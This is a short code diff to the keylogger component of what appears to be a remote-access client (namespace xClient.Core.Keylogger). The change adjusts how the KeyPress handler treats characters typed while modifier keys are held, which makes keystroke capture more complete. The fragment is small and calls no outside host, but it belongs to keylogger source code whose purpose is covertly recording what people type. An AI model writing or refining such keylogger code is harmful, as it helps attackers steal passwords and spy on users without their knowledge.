@@ -129,7 +129,7 @@ namespace xClient.Core.Keylogger
         //This method should be used to process all of our unicode characters
         private void Logger_KeyPress(object sender, KeyPressEventArgs e) //Called second
         {
-            if (_pressedKeys.IsModifierKeysSet())
+            if (_pressedKeys.IsModifierKeysSet() && _pressedKeys.Contains((Keys)char.ToUpper(e.KeyChar)))
                 return;
 
             if (!_pressedKeyChars.Contains(e.KeyChar) || !LoggerHelper.DetectKeyHolding(_pressedKeyChars, e.KeyChar))
